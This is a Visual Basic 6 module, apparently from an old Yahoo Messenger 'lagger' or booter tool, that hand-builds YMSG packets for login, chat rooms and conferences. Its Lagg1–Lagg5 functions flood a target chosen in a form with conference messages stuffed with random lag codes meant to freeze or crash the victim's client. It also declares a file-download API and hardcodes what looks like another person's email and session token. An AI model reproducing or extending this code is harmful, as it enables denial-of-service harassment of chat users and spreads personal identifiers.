Attribute VB_Name = "Module1"
Option Explicit
Const Name As String = "YMSG"
Const Ver As Integer = 13
Public Declare Function URLDownloadToFile Lib "urlmon" Alias "URLDownloadToFileA" (ByVal pCaller As Long, ByVal szURL As String, ByVal szFileName As String, ByVal dwReserved As Long, ByVal lpfnCB As Long) As Long
Private Function Header(ByVal StrPacketType As String, ByVal StrStat As String, ByVal StrSession As String, ByVal StrComm As Long) As String
On Error Resume Next
Dim Version As String
Version = 102
Header = "YMSG" & Chr(0) & Chr(&HF) & String(2, Chr(0)) & Chr(Int(Len(StrPacketType) / 256)) & Chr(Int(Len(StrPacketType) Mod 256)) & Chr(Int(StrComm / 256)) & Chr(Int(StrComm Mod 256)) & Mid(StrStat, 1, 4) & Mid(StrSession, 1, 4) & StrPacketType
End Function
Public Function Login(YahooID As String, YCookie As String, TCookie As String)
On Error Resume Next
Login = Header("0¿Ä" & YahooID & "¿Ä2¿Ä" & YahooID & "¿Ä1¿Ä" & YahooID & "¿Ä244¿Ä1¿Ä6¿Ä" & YCookie & " " & TCookie & "¿Ä98¿Äus¿Ä", String(4, Chr(0)), String(4, Chr(0)), 550)
End Function
Public Sub Pause(Interval)
On Error Resume Next
Dim Delay
Delay = Timer
Do While Timer - Delay < Val(Interval)
DoEvents
Loop
End Sub
Public Function GoToRoom(Whofrom As String)
  Dim Packet As String
    Packet = "109¿Ä" & Whofrom & "¿Ä1¿Ä" & Whofrom & "¿Ä6¿Äabcde¿Ä98¿Äus¿Ä135¿Äym9.0.0.907¿Ä"
    GoToRoom = Header(Packet, String(4, 0), String(4, 0), 150)
End Function
Public Function JoinRoom(Whofrom As String, RoomName As String, ByVal RoomKey As String)
  Dim Packet As String
    Packet = "1¿Ä" & Whofrom & "¿Ä104¿Ä" & RoomName & "¿Ä129¿Ä" & RoomKey & "¿Ä62¿Ä2¿Ä"
    JoinRoom = Header(Packet, String(4, 0), Whofrom, 152)
End Function
Public Function PreLogin() As String
    PreLogin = Header("", String(4, 0), String(4, 0), 76)
End Function


Sub GotoSite(URL As String)
On Error GoTo someerror
    If Left(LCase(URL), 4) = "www." Then URL = "http://" + URL
        Shell ("explorer.exe " + URL), vbNormalFocus
    Exit Sub
someerror:
    Beep
    Exit Sub
End Sub


Public Function LeaveRoom(YahooID As String) As String
  Dim Packet As String
    Packet = "1¿Ä" & YahooID & "¿Ä1005¿Ä357453521..lvlalvlacl-.-.-.-.-.-.-.-xterr0r@rogers.com..13..256..50..l2o5v4..52..lvlalvlacl-.-.-.-.-.-.-.-xterr0r@rogers.com..57..l2o5v4-KtqCObwvSn416ed83uI0Nw--..58..Join My Voice Conference.....97..1..233..t_KWLBpTpl74itc6Vh3o0NY36qgW5o5Is-..234..l2o5v4-KtqCObwvSn416ed83uI0Nw--.."
    LeaveRoom = Header(Packet, String(4, 0), YahooID, 15)
End Function

Public Function CF(MyID As String, WhoCF As String, Messege As String)
    CF = Header("1¿Ä" & MyID & "¿Ä50¿Ä" & MyID & "¿Ä57¿Ä" & MyID & "-1263205661¿Ä58¿Ä" & Messege & "¿Ä97¿Ä1¿Ä52¿Ä" & WhoCF & "¿Ä13¿Ä256¿Ä", String(4, Chr(0)), String(4, Chr(0)), 24)
End Function
Public Function CFText(MyID As String, Confkey As String, WhoCF As String, Messege As String)
    CFText = Header("1¿Ä" & MyID & "¿Ä57¿Ä" & Confkey & "¿Ä53¿Ä" & WhoCF & "¿Ä14¿Ä" & Messege & "¿Ä97¿Ä1¿Ä", String(4, Chr(0)), String(4, Chr(0)), 29)
End Function

Public Function CFJoin(MyID As String, CFkey As String, WhoInv As String)
    CFJoin = Header("1¿Ä" & MyID & "¿Ä57¿Ä" & CFkey & "¿Ä3¿Ä" & WhoInv & "¿Ä", String(4, Chr(0)), String(4, Chr(0)), 25)
End Function
Public Function CFLeft(MyID As String, CFkey As String, WhoInv As String)
    CFLeft = Header("1¿Ä" & MyID & "¿Ä57¿Ä" & CFkey & "¿Ä3¿Ä" & WhoInv & "¿Ä1005¿Ä28888624¿Ä", String(4, Chr(0)), String(4, Chr(0)), 27)
End Function
Public Function Lagg1(Whofrom As String) As String
On Error Resume Next
Lagg1 = Header("1¿Ä" & Whofrom & "¿Ä57¿Ä" & iForm.Text2.Text & "¿Ä53¿Ä" & iForm.Text1.Text & "¿Ä14¿Ä" & RandomAlt & RandomFont & Randomlaggcode & "¿Ä97¿Ä1¿Ä", String(4, Chr(0)), String(4, Chr(0)), 29)
End Function

Public Function Lagg2(Whofrom As String) As String
On Error Resume Next
Lagg2 = Header("1¿Ä" & Whofrom & "¿Ä57¿Ä" & iForm.Text2.Text & "¿Ä53¿Ä" & iForm.Text1.Text & "¿Ä14¿Ä" & RandomAlt & RandomFont & Randomlaggcode & "¿Ä97¿Ä1¿Ä", String(4, Chr(0)), String(4, Chr(0)), 29)
End Function
Public Function Lagg3(Whofrom As String) As String
On Error Resume Next
Lagg3 = Header("1¿Ä" & Whofrom & "¿Ä57¿Ä" & iForm.Text2.Text & "¿Ä53¿Ä" & iForm.Text1.Text & "¿Ä14¿Ä" & RandomSS & RandomSS & RandomSS & "¿Ä97¿Ä1¿Ä", String(4, Chr(0)), String(4, Chr(0)), 29)
End Function

Public Function Lagg4(Whofrom As String) As String
On Error Resume Next
Lagg4 = Header("1¿Ä" & Whofrom & "¿Ä57¿Ä" & iForm.Text2.Text & "¿Ä53¿Ä" & iForm.Text1.Text & "¿Ä14¿Ä" & RandomSS & RandomS55 & RandomS33 & "¿Ä97¿Ä1¿Ä", String(4, Chr(0)), String(4, Chr(0)), 29)
End Function
Public Function Lagg5(Whofrom As String) As String
On Error Resume Next
Lagg5 = Header("1¿Ä" & Whofrom & "¿Ä57¿Ä" & iForm.Text2.Text & "¿Ä53¿Ä" & iForm.Text1.Text & "¿Ä14¿Ä" & RandomSS & RandomS55 & RandomS33 & RandomS11 & RandomS22 & "¿Ä97¿Ä1¿Ä", String(4, Chr(0)), String(4, Chr(0)), 29)
End Function
